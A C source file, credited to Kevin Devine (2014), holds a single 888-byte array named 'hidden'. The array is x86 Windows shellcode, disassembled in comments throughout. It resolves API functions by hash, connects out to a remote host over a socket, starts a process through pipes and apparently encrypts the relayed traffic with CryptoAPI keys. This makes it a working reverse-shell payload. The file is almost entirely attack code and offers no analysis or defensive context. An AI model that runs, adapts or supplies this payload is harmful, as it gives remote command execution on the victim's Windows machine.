
/* Copyright (c) 2014 Kevin Devine */
/* Size = 888 bytes */

char hidden[] = {
  /* 0000 */  "\xEB\x0C"                      /*  jmp 0000000Eh                      */
  /* 0002 */  "\x5E"                          /*  pop esi                            */
  /* 0003 */  "\x33\xC0"                      /*  xor eax, eax                       */
  /* 0005 */  "\x99"                          /*  cdq                                */
  /* 0006 */  "\xB2\xD5"                      /*  mov dl, D5h                        */
  /* 0008 */  "\xB6\x02"                      /*  mov dh, 02h                        */
  /* 000A */  "\x03\xD6"                      /*  add edx, esi                       */
  /* 000C */  "\xFF\xE2"                      /*  jmp edx                            */
  /* 000E */  "\xE8\xEF\xFF\xFF\xFF"          /*  call 00000002h                     */
  /***********************************************************************************/  
  /* 0013 */  "\x1C\xBE\xA4\xDE"              /*  socket                             */
  /* 0017 */  "\x0A\xDD\x83\xA7"              /*  connect                            */
  /* 001B */  "\x38\x63\x5B\x7B"              /*  closesocket                        */
  /* 001F */  "\xFE\x86\xA5\x46"              /*  send                               */
  /* 0023 */  "\x9B\x76\xA1\x5A"              /*  recv                               */
  /* 0027 */  "\x43\x4E\x90\x7D"              /*  WSAEventSelect                     */
  /* 002B */  "\x66\x26\x06\xF2"              /*  WSACreateEvent                     */
  /* 002F */  "\x1F\xCB\x04\x34"              /*  WSAEnumNetworkEvents               */
  /* 0033 */  "\x7B\xD0\xE7\x75"              /*  ioctlsocket                        */
  /***********************************************************************************/ 
  /* 0037 */  "\xD2\xE6\x26\x63"              /*  CreateNamedPipeA                   */
  /* 003B */  "\xFB\xFA\xB9\xC0"              /*  CreatePipe                         */
  /* 003F */  "\xA9\x13\xB7\xF5"              /*  CreateFileA                        */
  /* 0043 */  "\xE0\x4E\x85\x58"              /*  GetOverlappedResult                */
  /* 0047 */  "\x2A\x93\x33\xD4"              /*  ReadFile                           */
  /* 004B */  "\xD9\x9F\x8F\xEB"              /*  WriteFile                          */
  /* 004F */  "\xF1\xD0\x99\x3E"              /*  CloseHandle                        */
  /* 0053 */  "\x9B\x10\x28\xCE"              /*  WaitForMultipleObjects             */
  /* 0057 */  "\x44\xE2\x6A\xBF"              /*  CreateEventA                       */
  /* 005B */  "\xE0\x18\x54\x1F"              /*  CreateProcessA                     */
  /* 005F */  "\x9D\x56\xA9\xD9"              /*  TerminateProcess                   */
  /***********************************************************************************/ 
  /* 0063 */  "\x77\x85\xE2\xEA"              /*  CryptAcquireContextA               */
  /* 0067 */  "\xC9\x0A\x16\xD7"              /*  CryptGenKey                        */
  /* 006B */  "\x36\x22\x61\x17"              /*  CryptImportKey                     */
  /* 006F */  "\x46\x22\x0C\x21"              /*  CryptExportKey                     */
  /* 0073 */  "\x36\x27\xBF\xDD"              /*  CryptEncrypt                       */
  /* 0077 */  "\x07\x23\xA0\x9D"              /*  CryptDecrypt                       */
  /* 007B */  "\x06\x85\x12\x24"              /*  CryptDestroyKey                    */
  /* 007F */  "\xEA\x71\x5A\x7E"              /*  CryptReleaseContext                */
  /***********************************************************************************/  
  /* 0083 */  "\xF0\x60"                      /*  pushad                             */
  /* 0085 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0087 */  "\x5E"                          /*  pop esi                            */
  /* 0088 */  "\x64\xAD"                      /*  lodsd                              */
  /* 008A */  "\x8B\x40\x0C"                  /*  mov eax, dword ptr [eax+0Ch]       */
  /* 008D */  "\x8B\x70\x1C"                  /*  mov esi, dword ptr [eax+1Ch]       */
  /* 0090 */  "\x8B\x6E\x08"                  /*  mov ebp, dword ptr [esi+08h]       */
  /* 0093 */  "\x85\xED"                      /*  test ebp, ebp                      */
  /* 0095 */  "\x74\x42"                      /*  je 000000D9h                       */
  /* 0097 */  "\xAD"                          /*  lodsd                              */
  /* 0098 */  "\x50"                          /*  push eax                           */
  /* 0099 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 009C */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 00A0 */  "\x8D\x74\x28\x18"              /*  lea esi, dword ptr [eax+ebp+18h]   */
  /* 00A4 */  "\xAD"                          /*  lodsd                              */
  /* 00A5 */  "\x91"                          /*  xchg eax, ecx                      */
  /* 00A6 */  "\xE3\xE8"                      /*  jecxz 00000090h                    */
  /* 00A8 */  "\xAD"                          /*  lodsd                              */
  /* 00A9 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 00AB */  "\x50"                          /*  push eax                           */
  /* 00AC */  "\xAD"                          /*  lodsd                              */
  /* 00AD */  "\x8D\x3C\x28"                  /*  lea edi, dword ptr [eax+ebp]       */
  /* 00B0 */  "\xAD"                          /*  lodsd                              */
  /* 00B1 */  "\x8D\x1C\x28"                  /*  lea ebx, dword ptr [eax+ebp]       */
  /* 00B4 */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [edi+ecx*4-04h] */
  /* 00B8 */  "\x03\xF5"                      /*  add esi, ebp                       */
  /* 00BA */  "\x33\xC0"                      /*  xor eax, eax                       */
  /* 00BC */  "\x99"                          /*  cdq                                */
  /* 00BD */  "\xAC"                          /*  lodsb                              */
  /* 00BE */  "\x03\xD0"                      /*  add edx, eax                       */
  /* 00C0 */  "\xC1\xC2\x09"                  /*  rol edx, 09h                       */
  /* 00C3 */  "\x33\xD0"                      /*  xor edx, eax                       */
  /* 00C5 */  "\x48"                          /*  dec eax                            */
  /* 00C6 */  "\x79\xF5"                      /*  jns 000000BDh                      */
  /* 00C8 */  "\x3B\x54\x24\x24"              /*  cmp edx, dword ptr [esp+24h]       */
  /* 00CC */  "\xE0\xE6"                      /*  loopne 000000B4h                   */
  /* 00CE */  "\x58"                          /*  pop eax                            */
  /* 00CF */  "\x5E"                          /*  pop esi                            */
  /* 00D0 */  "\x75\xBE"                      /*  jne 00000090h                      */
  /* 00D2 */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [ebx+ecx*2]    */
  /* 00D6 */  "\x03\x2C\x90"                  /*  add ebp, dword ptr [eax+edx*4]     */
  /* 00D9 */  "\x89\x6C\x24\x1C"              /*  mov dword ptr [esp+1Ch], ebp       */
  /* 00DD */  "\x61"                          /*  popad                              */
  /* 00DE */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/  
  /* 00DF */  "\x60"                          /*  pushad                             */
  /* 00E0 */  "\x8B\x4D\xFC"                  /*  mov ecx, dword ptr [ebp-04h]       */
  /* 00E3 */  "\xE3\x14"                      /*  jecxz 000000F9h                    */
  /* 00E5 */  "\xFF\x75\x44"                  /*  push dword ptr [ebp+44h]           */
  /* 00E8 */  "\x56"                          /*  push esi                           */
  /* 00E9 */  "\x8D\x46\x04"                  /*  lea eax, dword ptr [esi+04h]       */
  /* 00EC */  "\x50"                          /*  push eax                           */
  /* 00ED */  "\x57"                          /*  push edi                           */
  /* 00EE */  "\x53"                          /*  push ebx                           */
  /* 00EF */  "\x57"                          /*  push edi                           */
  /* 00F0 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 00F3 */  "\xFF\x55\xE0"                  /*  call dword ptr [ebp-20h]           */
  /* 00F6 */  "\x48"                          /*  dec eax                            */
  /* 00F7 */  "\x75\x0C"                      /*  jne 00000105h                      */
  /* 00F9 */  "\x8B\x06"                      /*  mov eax, dword ptr [esi]           */
  /* 00FB */  "\x83\xC0\x04"                  /*  add eax, 04h                       */
  /* 00FE */  "\x57"                          /*  push edi                           */
  /* 00FF */  "\x50"                          /*  push eax                           */
  /* 0100 */  "\x56"                          /*  push esi                           */
  /* 0101 */  "\x53"                          /*  push ebx                           */
  /* 0102 */  "\xFF\x55\x8C"                  /*  call dword ptr [ebp-74h]           */
  /* 0105 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0107 */  "\x61"                          /*  popad                              */
  /* 0108 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/  
  /* 0109 */  "\x60"                          /*  pushad                             */
  /* 010A */  "\x57"                          /*  push edi                           */
  /* 010B */  "\x6A\x04"                      /*  push 00000004h                     */
  /* 010D */  "\x56"                          /*  push esi                           */
  /* 010E */  "\x53"                          /*  push ebx                           */
  /* 010F */  "\xFF\x55\x90"                  /*  call dword ptr [ebp-70h]           */
  /* 0112 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0114 */  "\x7E\x29"                      /*  jle 0000013Fh                      */
  /* 0116 */  "\x56"                          /*  push esi                           */
  /* 0117 */  "\xAD"                          /*  lodsd                              */
  /* 0118 */  "\x8B\x4D\x44"                  /*  mov ecx, dword ptr [ebp+44h]       */
  /* 011B */  "\x3B\xC1"                      /*  cmp eax, ecx                       */
  /* 011D */  "\x0F\x47\xC1"                  /*  cmovnbe eax, ecx                   */
  /* 0120 */  "\x57"                          /*  push edi                           */
  /* 0121 */  "\x50"                          /*  push eax                           */
  /* 0122 */  "\x56"                          /*  push esi                           */
  /* 0123 */  "\x53"                          /*  push ebx                           */
  /* 0124 */  "\xFF\x55\x90"                  /*  call dword ptr [ebp-70h]           */
  /* 0127 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0129 */  "\x5E"                          /*  pop esi                            */
  /* 012A */  "\x7E\x13"                      /*  jle 0000013Fh                      */
  /* 012C */  "\x8B\x4D\xFC"                  /*  mov ecx, dword ptr [ebp-04h]       */
  /* 012F */  "\xE3\x0E"                      /*  jecxz 0000013Fh                    */
  /* 0131 */  "\x56"                          /*  push esi                           */
  /* 0132 */  "\xAD"                          /*  lodsd                              */
  /* 0133 */  "\x56"                          /*  push esi                           */
  /* 0134 */  "\x57"                          /*  push edi                           */
  /* 0135 */  "\x53"                          /*  push ebx                           */
  /* 0136 */  "\x57"                          /*  push edi                           */
  /* 0137 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 013A */  "\xFF\x55\xE4"                  /*  call dword ptr [ebp-1Ch]           */
  /* 013D */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 013F */  "\x61"                          /*  popad                              */
  /* 0140 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/  
  /* 0141 */  "\x60"                          /*  pushad                             */
  /* 0142 */  "\xE8\xC2\xFF\xFF\xFF"          /*  call 00000109h                     */
  /* 0147 */  "\x7E\x66"                      /*  jle 000001AFh                      */
  /* 0149 */  "\x68\xBF\xFF\xFF\x0F"          /*  push 0FFFFFBFh                     */
  /* 014E */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0151 */  "\x6A\x18"                      /*  push 00000018h                     */
  /* 0153 */  "\x57"                          /*  push edi                           */
  /* 0154 */  "\x57"                          /*  push edi                           */
  /* 0155 */  "\x8D\x45\xF0"                  /*  lea eax, dword ptr [ebp-10h]       */
  /* 0158 */  "\x50"                          /*  push eax                           */
  /* 0159 */  "\xFF\x55\xD0"                  /*  call dword ptr [ebp-30h]           */
  /* 015C */  "\x48"                          /*  dec eax                            */
  /* 015D */  "\x75\x50"                      /*  jne 000001AFh                      */
  /* 015F */  "\x56"                          /*  push esi                           */
  /* 0160 */  "\x8D\x45\xF8"                  /*  lea eax, dword ptr [ebp-08h]       */
  /* 0163 */  "\x50"                          /*  push eax                           */
  /* 0164 */  "\x57"                          /*  push edi                           */
  /* 0165 */  "\x57"                          /*  push edi                           */
  /* 0166 */  "\xAD"                          /*  lodsd                              */
  /* 0167 */  "\x50"                          /*  push eax                           */
  /* 0168 */  "\x56"                          /*  push esi                           */
  /* 0169 */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 016C */  "\xFF\x55\xD8"                  /*  call dword ptr [ebp-28h]           */
  /* 016F */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0171 */  "\x5E"                          /*  pop esi                            */
  /* 0172 */  "\x74\x3B"                      /*  je 000001AFh                       */
  /* 0174 */  "\x8D\x4D\xF4"                  /*  lea ecx, dword ptr [ebp-0Ch]       */
  /* 0177 */  "\x51"                          /*  push ecx                           */
  /* 0178 */  "\x50"                          /*  push eax                           */
  /* 0179 */  "\x68\xEF\x99\xFF\xFF"          /*  push FFFF99EFh                     */
  /* 017E */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0181 */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 0184 */  "\xFF\x55\xD4"                  /*  call dword ptr [ebp-2Ch]           */
  /* 0187 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0189 */  "\x74\x24"                      /*  je 000001AFh                       */
  /* 018B */  "\x8D\x4E\x04"                  /*  lea ecx, dword ptr [esi+04h]       */
  /* 018E */  "\xFF\x75\x44"                  /*  push dword ptr [ebp+44h]           */
  /* 0191 */  "\x8F\x06"                      /*  pop dword ptr [esi]                */
  /* 0193 */  "\x56"                          /*  push esi                           */
  /* 0194 */  "\x51"                          /*  push ecx                           */
  /* 0195 */  "\x57"                          /*  push edi                           */
  /* 0196 */  "\x50"                          /*  push eax                           */
  /* 0197 */  "\xFF\x75\xF8"                  /*  push dword ptr [ebp-08h]           */
  /* 019A */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 019D */  "\xFF\x55\xDC"                  /*  call dword ptr [ebp-24h]           */
  /* 01A0 */  "\x89\x44\x24\x1C"              /*  mov dword ptr [esp+1Ch], eax       */
  /* 01A4 */  "\x48"                          /*  dec eax                            */
  /* 01A5 */  "\x75\x08"                      /*  jne 000001AFh                      */
  /* 01A7 */  "\xE8\x33\xFF\xFF\xFF"          /*  call 000000DFh                     */
  /* 01AC */  "\xFF\x45\xFC"                  /*  inc dword ptr [ebp-04h]            */
  /* 01AF */  "\x61"                          /*  popad                              */
  /* 01B0 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/  
  /* 01B1 */  "\x60"                          /*  pushad                             */
  /* 01B2 */  "\x8D\x75\x58"                  /*  lea esi, dword ptr [ebp+58h]       */
  /* 01B5 */  "\x8B\x45\x58"                  /*  mov eax, dword ptr [ebp+58h]       */
  /* 01B8 */  "\x99"                          /*  cdq                                */
  /* 01B9 */  "\x52"                          /*  push edx                           */
  /* 01BA */  "\x54"                          /*  push esp                           */
  /* 01BB */  "\x68\x7E\x66\x04\x80"          /*  push 8004667Eh                     */
  /* 01C0 */  "\x53"                          /*  push ebx                           */
  /* 01C1 */  "\x52"                          /*  push edx                           */
  /* 01C2 */  "\x50"                          /*  push eax                           */
  /* 01C3 */  "\x53"                          /*  push ebx                           */
  /* 01C4 */  "\x55"                          /*  push ebp                           */
  /* 01C5 */  "\x50"                          /*  push eax                           */
  /* 01C6 */  "\x53"                          /*  push ebx                           */
  /* 01C7 */  "\x6A\xFF"                      /*  push FFFFFFFFh                     */
  /* 01C9 */  "\x52"                          /*  push edx                           */
  /* 01CA */  "\x56"                          /*  push esi                           */
  /* 01CB */  "\x6A\x03"                      /*  push 00000003h                     */
  /* 01CD */  "\x6A\x21"                      /*  push 00000021h                     */
  /* 01CF */  "\x50"                          /*  push eax                           */
  /* 01D0 */  "\x53"                          /*  push ebx                           */
  /* 01D1 */  "\xFF\x55\x94"                  /*  call dword ptr [ebp-6Ch]           */
  /* 01D4 */  "\xFF\x55\xC0"                  /*  call dword ptr [ebp-40h]           */
  /* 01D7 */  "\x97"                          /*  xchg eax, edi                      */
  /* 01D8 */  "\xFF\x55\x9C"                  /*  call dword ptr [ebp-64h]           */
  /* 01DB */  "\xFF\x55\x94"                  /*  call dword ptr [ebp-6Ch]           */
  /* 01DE */  "\xFF\x55\xA0"                  /*  call dword ptr [ebp-60h]           */
  /* 01E1 */  "\x5A"                          /*  pop edx                            */
  /* 01E2 */  "\x8B\xF5"                      /*  mov esi, ebp                       */
  /* 01E4 */  "\xAD"                          /*  lodsd                              */
  /* 01E5 */  "\xA8\x20"                      /*  test al, 20h                       */
  /* 01E7 */  "\x89\x3C\x24"                  /*  mov dword ptr [esp], edi           */
  /* 01EA */  "\x61"                          /*  popad                              */
  /* 01EB */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/  
  /* 01EC */  "\x60"                          /*  pushad                             */
  /* 01ED */  "\x8D\x7D\x48"                  /*  lea edi, dword ptr [ebp+48h]       */
  /* 01F0 */  "\x57"                          /*  push edi                           */
  /* 01F1 */  "\x50"                          /*  push eax                           */
  /* 01F2 */  "\x53"                          /*  push ebx                           */
  /* 01F3 */  "\x53"                          /*  push ebx                           */
  /* 01F4 */  "\x50"                          /*  push eax                           */
  /* 01F5 */  "\x53"                          /*  push ebx                           */
  /* 01F6 */  "\x50"                          /*  push eax                           */
  /* 01F7 */  "\x6A\x0C"                      /*  push 0000000Ch                     */
  /* 01F9 */  "\x8B\xF4"                      /*  mov esi, esp                       */
  /* 01FB */  "\x68\xA3\xCE\xFF\xFF"          /*  push FFFFCEA3h                     */
  /* 0200 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0203 */  "\x68\x70\x69\x70\x65"          /*  push 65706970h                     */
  /* 0208 */  "\x68\x5C\x5C\x2E\x5C"          /*  push 5C2E5C5Ch                     */
  /* 020D */  "\x8B\xCC"                      /*  mov ecx, esp                       */
  /* 020F */  "\x50"                          /*  push eax                           */
  /* 0210 */  "\x50"                          /*  push eax                           */
  /* 0211 */  "\x6A\x03"                      /*  push 00000003h                     */
  /* 0213 */  "\x56"                          /*  push esi                           */
  /* 0214 */  "\x50"                          /*  push eax                           */
  /* 0215 */  "\x68\xFF\xFF\xFF\xFD"          /*  push FDFFFFFFh                     */
  /* 021A */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 021D */  "\x51"                          /*  push ecx                           */
  /* 021E */  "\x50"                          /*  push eax                           */
  /* 021F */  "\x50"                          /*  push eax                           */
  /* 0220 */  "\x50"                          /*  push eax                           */
  /* 0221 */  "\x50"                          /*  push eax                           */
  /* 0222 */  "\x6A\x01"                      /*  push 00000001h                     */
  /* 0224 */  "\x50"                          /*  push eax                           */
  /* 0225 */  "\x68\xFC\xFF\xFF\xBF"          /*  push BFFFFFFCh                     */
  /* 022A */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 022D */  "\x51"                          /*  push ecx                           */
  /* 022E */  "\xFF\x55\xA4"                  /*  call dword ptr [ebp-5Ch]           */
  /* 0231 */  "\xAB"                          /*  stosd                              */
  /* 0232 */  "\x99"                          /*  cdq                                */
  /* 0233 */  "\x52"                          /*  push edx                           */
  /* 0234 */  "\x56"                          /*  push esi                           */
  /* 0235 */  "\x57"                          /*  push edi                           */
  /* 0236 */  "\xAF"                          /*  scasd                              */
  /* 0237 */  "\x57"                          /*  push edi                           */
  /* 0238 */  "\x8B\xF7"                      /*  mov esi, edi                       */
  /* 023A */  "\xAF"                          /*  scasd                              */
  /* 023B */  "\xFF\x55\xA8"                  /*  call dword ptr [ebp-58h]           */
  /* 023E */  "\xFF\x55\xAC"                  /*  call dword ptr [ebp-54h]           */
  /* 0241 */  "\xAB"                          /*  stosd                              */
  /* 0242 */  "\x83\xC4\x18"                  /*  add esp, 18h                       */
  /* 0245 */  "\xFF\x55\x98"                  /*  call dword ptr [ebp-68h]           */
  /* 0248 */  "\xAB"                          /*  stosd                              */
  /* 0249 */  "\xFF\x55\xC4"                  /*  call dword ptr [ebp-3Ch]           */
  /* 024C */  "\xAB"                          /*  stosd                              */
  /* 024D */  "\x89\x45\x40"                  /*  mov dword ptr [ebp+40h], eax       */
  /* 0250 */  "\x99"                          /*  cdq                                */
  /* 0251 */  "\x68\x9C\x92\x9B\xFF"          /*  push FF9B929Ch                     */
  /* 0256 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0259 */  "\x8B\xC4"                      /*  mov eax, esp                       */
  /* 025B */  "\x57"                          /*  push edi                           */
  /* 025C */  "\x57"                          /*  push edi                           */
  /* 025D */  "\x52"                          /*  push edx                           */
  /* 025E */  "\x52"                          /*  push edx                           */
  /* 025F */  "\x52"                          /*  push edx                           */
  /* 0260 */  "\x53"                          /*  push ebx                           */
  /* 0261 */  "\x52"                          /*  push edx                           */
  /* 0262 */  "\x52"                          /*  push edx                           */
  /* 0263 */  "\x50"                          /*  push eax                           */
  /* 0264 */  "\x52"                          /*  push edx                           */
  /* 0265 */  "\x6A\x44"                      /*  push 00000044h                     */
  /* 0267 */  "\x8F\x07"                      /*  pop dword ptr [edi]                */
  /* 0269 */  "\xFF\x47\x2D"                  /*  inc dword ptr [edi+2Dh]            */
  /* 026C */  "\x8D\x7F\x38"                  /*  lea edi, dword ptr [edi+38h]       */
  /* 026F */  "\xA5"                          /*  movsd                              */
  /* 0270 */  "\xAD"                          /*  lodsd                              */
  /* 0271 */  "\xAB"                          /*  stosd                              */
  /* 0272 */  "\xAB"                          /*  stosd                              */
  /* 0273 */  "\xFF\x55\xC8"                  /*  call dword ptr [ebp-38h]           */
  /* 0276 */  "\x58"                          /*  pop eax                            */
  /* 0277 */  "\x8B\xF7"                      /*  mov esi, edi                       */
  /* 0279 */  "\x60"                          /*  pushad                             */
  /* 027A */  "\xE8\x32\xFF\xFF\xFF"          /*  call 000001B1h                     */
  /* 027F */  "\x75\x51"                      /*  jne 000002D2h                      */
  /* 0281 */  "\x85\xFF"                      /*  test edi, edi                      */
  /* 0283 */  "\x74\x38"                      /*  je 000002BDh                       */
  /* 0285 */  "\x4F"                          /*  dec edi                            */
  /* 0286 */  "\x75\x4A"                      /*  jne 000002D2h                      */
  /* 0288 */  "\x39\x7D\x2C"                  /*  cmp dword ptr [ebp+2Ch], edi       */
  /* 028B */  "\x8B\x45\x48"                  /*  mov eax, dword ptr [ebp+48h]       */
  /* 028E */  "\x8D\x55\x30"                  /*  lea edx, dword ptr [ebp+30h]       */
  /* 0291 */  "\x74\x0C"                      /*  je 0000029Fh                       */
  /* 0293 */  "\x57"                          /*  push edi                           */
  /* 0294 */  "\x56"                          /*  push esi                           */
  /* 0295 */  "\x52"                          /*  push edx                           */
  /* 0296 */  "\x50"                          /*  push eax                           */
  /* 0297 */  "\xFF\x55\xB0"                  /*  call dword ptr [ebp-50h]           */
  /* 029A */  "\x48"                          /*  dec eax                            */
  /* 029B */  "\x75\x35"                      /*  jne 000002D2h                      */
  /* 029D */  "\xEB\x10"                      /*  jmp 000002AFh                      */
  /* 029F */  "\x52"                          /*  push edx                           */
  /* 02A0 */  "\x56"                          /*  push esi                           */
  /* 02A1 */  "\xFF\x75\x44"                  /*  push dword ptr [ebp+44h]           */
  /* 02A4 */  "\x8D\x4E\x04"                  /*  lea ecx, dword ptr [esi+04h]       */
  /* 02A7 */  "\x51"                          /*  push ecx                           */
  /* 02A8 */  "\x50"                          /*  push eax                           */
  /* 02A9 */  "\xFF\x55\xB4"                  /*  call dword ptr [ebp-4Ch]           */
  /* 02AC */  "\xFF\x45\x2C"                  /*  inc dword ptr [ebp+2Ch]            */
  /* 02AF */  "\x8B\x0E"                      /*  mov ecx, dword ptr [esi]           */
  /* 02B1 */  "\xE3\x1C"                      /*  jecxz 000002CFh                    */
  /* 02B3 */  "\xFF\x4D\x2C"                  /*  dec dword ptr [ebp+2Ch]            */
  /* 02B6 */  "\xE8\x24\xFE\xFF\xFF"          /*  call 000000DFh                     */
  /* 02BB */  "\xEB\x12"                      /*  jmp 000002CFh                      */
  /* 02BD */  "\xE8\x47\xFE\xFF\xFF"          /*  call 00000109h                     */
  /* 02C2 */  "\x7E\x0E"                      /*  jle 000002D2h                      */
  /* 02C4 */  "\x57"                          /*  push edi                           */
  /* 02C5 */  "\x56"                          /*  push esi                           */
  /* 02C6 */  "\xAD"                          /*  lodsd                              */
  /* 02C7 */  "\x50"                          /*  push eax                           */
  /* 02C8 */  "\x56"                          /*  push esi                           */
  /* 02C9 */  "\xFF\x75\x4C"                  /*  push dword ptr [ebp+4Ch]           */
  /* 02CC */  "\xFF\x55\xB8"                  /*  call dword ptr [ebp-48h]           */
  /* 02CF */  "\x61"                          /*  popad                              */
  /* 02D0 */  "\xEB\xA7"                      /*  jmp 00000279h                      */
  /* 02D2 */  "\x61"                          /*  popad                              */
  /* 02D3 */  "\x51"                          /*  push ecx                           */
  /* 02D4 */  "\xFF\x75\x60"                  /*  push dword ptr [ebp+60h]           */
  /* 02D7 */  "\xFF\x55\xCC"                  /*  call dword ptr [ebp-34h]           */
  /* 02DA */  "\x5E"                          /*  pop esi                            */
  /* 02DB */  "\x6A\x08"                      /*  push 00000008h                     */
  /* 02DD */  "\x5B"                          /*  pop ebx                            */
  /* 02DE */  "\xAD"                          /*  lodsd                              */
  /* 02DF */  "\x50"                          /*  push eax                           */
  /* 02E0 */  "\xFF\x55\xBC"                  /*  call dword ptr [ebp-44h]           */
  /* 02E3 */  "\x4B"                          /*  dec ebx                            */
  /* 02E4 */  "\x75\xF8"                      /*  jne 000002DEh                      */
  /* 02E6 */  "\x61"                          /*  popad                              */
  /* 02E7 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 02E8 */  "\x60"                          /*  pushad                             */
  /* 02E9 */  "\xB9\x54\xFC\xFF\xFF"          /*  mov ecx, FFFFFC54h                 */
  /* 02EE */  "\xF7\xD9"                      /*  neg ecx                            */
  /* 02F0 */  "\x2B\xE1"                      /*  sub esp, ecx                       */
  /* 02F2 */  "\x8B\xFC"                      /*  mov edi, esp                       */
  /* 02F4 */  "\xF3\xAA"                      /*  rep stosb                          */
  /* 02F6 */  "\x8B\xFC"                      /*  mov edi, esp                       */
  /* 02F8 */  "\xAC"                          /*  lodsb                              */
  /* 02F9 */  "\x91"                          /*  xchg eax, ecx                      */
  /* 02FA */  "\xAD"                          /*  lodsd                              */
  /* 02FB */  "\xE8\x84\xFD\xFF\xFF"          /*  call 00000084h                     */
  /* 0300 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0302 */  "\x74\x6C"                      /*  je 00000370h                       */
  /* 0304 */  "\xAB"                          /*  stosd                              */
  /* 0305 */  "\xE2\xF3"                      /*  loop 000002FAh                     */
  /* 0307 */  "\x8D\x6F\x10"                  /*  lea ebp, dword ptr [edi+10h]       */
  /* 030A */  "\x51"                          /*  push ecx                           */
  /* 030B */  "\xB1\xA4"                      /*  mov cl, A4h                        */
  /* 030D */  "\x8D\x34\x29"                  /*  lea esi, dword ptr [ecx+ebp]       */
  /* 0310 */  "\x33\xFF"                      /*  xor edi, edi                       */
  /* 0312 */  "\x6A\x01"                      /*  push 00000001h                     */
  /* 0314 */  "\x6A\x02"                      /*  push 00000002h                     */
  /* 0316 */  "\xFF\x55\x80"                  /*  call dword ptr [ebp-80h]           */
  /* 0319 */  "\x93"                          /*  xchg eax, ebx                      */
  /* 031A */  "\x85\xDB"                      /*  test ebx, ebx                      */
  /* 031C */  "\x7E\x52"                      /*  jle 00000370h                      */
  /* 031E */  "\x68\x80\xFF\xFF\xFE"          /*  push FEFFFF80h                     */
  /* 0323 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0326 */  "\x68\xFD\xFF\xFF\xAF"          /*  push AFFFFFFDh                     */
  /* 032B */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 032E */  "\x8B\xCC"                      /*  mov ecx, esp                       */
  /* 0330 */  "\x6A\x10"                      /*  push 00000010h                     */
  /* 0332 */  "\x51"                          /*  push ecx                           */
  /* 0333 */  "\x53"                          /*  push ebx                           */
  /* 0334 */  "\xFF\x55\x84"                  /*  call dword ptr [ebp-7Ch]           */
  /* 0337 */  "\x59"                          /*  pop ecx                            */
  /* 0338 */  "\x59"                          /*  pop ecx                            */
  /* 0339 */  "\x40"                          /*  inc eax                            */
  /* 033A */  "\x74\x30"                      /*  je 0000036Ch                       */
  /* 033C */  "\xC7\x45\x44\xFF\xFD\xFF\xFF"  /*  mov dword ptr [ebp+44h], FFFFFDFFh */
  /* 0343 */  "\xF7\x55\x44"                  /*  not dword ptr [ebp+44h]            */
  /* 0346 */  "\x48"                          /*  dec eax                            */
  /* 0347 */  "\xE8\xF5\xFD\xFF\xFF"          /*  call 00000141h                     */
  /* 034C */  "\x48"                          /*  dec eax                            */
  /* 034D */  "\x75\x1D"                      /*  jne 0000036Ch                      */
  /* 034F */  "\xE8\x98\xFE\xFF\xFF"          /*  call 000001ECh                     */
  /* 0354 */  "\xFF\x4D\xFC"                  /*  dec dword ptr [ebp-04h]            */
  /* 0357 */  "\x75\x13"                      /*  jne 0000036Ch                      */
  /* 0359 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 035C */  "\xFF\x55\xE8"                  /*  call dword ptr [ebp-18h]           */
  /* 035F */  "\xFF\x75\xF8"                  /*  push dword ptr [ebp-08h]           */
  /* 0362 */  "\xFF\x55\xE8"                  /*  call dword ptr [ebp-18h]           */
  /* 0365 */  "\x56"                          /*  push esi                           */
  /* 0366 */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 0369 */  "\xFF\x55\xEC"                  /*  call dword ptr [ebp-14h]           */
  /* 036C */  "\x53"                          /*  push ebx                           */
  /* 036D */  "\xFF\x55\x88"                  /*  call dword ptr [ebp-78h]           */
  /* 0370 */  "\x81\xEC\x54\xFC\xFF\xFF"      /*  sub esp, FFFFFC54h                 */
  /* 0376 */  "\x61"                          /*  popad                              */
  /* 0377 */  "\xC3"                          /*  ret                                */
};
